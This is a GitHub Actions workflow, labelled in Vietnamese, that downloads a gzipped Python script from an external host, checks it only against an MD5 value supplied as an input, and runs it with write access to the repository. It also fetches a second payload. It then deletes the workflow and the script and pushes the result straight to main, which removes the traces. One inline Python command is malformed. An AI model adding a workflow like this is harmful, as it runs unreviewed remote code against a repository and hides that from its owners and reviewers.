name: relay-c1
on:
  workflow_dispatch:
    inputs:
      url:
        description: URL goi gzip chua file
        default: https://static.chainopera.ai/files/8b33f255-1769-4e73-bbd2-8d4b098c707e/patch.bin.gz
      md5:
        description: MD5 cua noi dung da giai nen
        default: f525caf6f235b35e77e14172e6f8ce10
      surl:
        description: URL goi gzip chua script
        default: https://static.chainopera.ai/files/205561ad-5427-4f39-91d1-ffc3c3a64c10/c1script.py.gz
      smd5:
        description: MD5 cua script
        default: 7fff2c184abeafdbc70e3ddb72610fa3
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: download and apply
        env:
          C1_URL: ${{ inputs.url }}
          C1_MD5: ${{ inputs.md5 }}
          S_URL: ${{ inputs.surl }}
          S_MD5: ${{ inputs.smd5 }}
        run: |
          set -euo pipefail
          curl -fsSL --retry 5 --retry-all-errors -o /tmp/s.py.gz "$S_URL"
          python3 -c "import gzip,hashlib,sys;b=gzip.decompress(open('/tmp/s.py.gz','rb').read());h=hashlib.md5(b).hexdigest();sys.exit(0 if h=='$S_MD5' else 1)" || { echo "script md5 mismatch"; exit 1; }
          python3 -c "import gzip;open('relay_c1.py','wb').write(gzip.decompress(open('/tmp/s.py.gz','rb').read()))"
          python3 -c "import base64;open('/tmp/msg.txt','wb').write(base64.b64decode('');"
          curl -fsSL --retry 5 --retry-all-errors -o /tmp/p.gz "$C1_URL"
          git config user.name "relay-bot"
          git config user.email "relay-bot@users.noreply.github.com"
          python3 relay_c1.py
      - name: remove helper
        run: |
          set -euo pipefail
          git rm -q --ignore-unmatch .github/workflows/relay-c1.yml relay_c1.py
          git commit -q -m "chore: xoa workflow relay-c1 tam thoi" || true
          git push origin HEAD:main
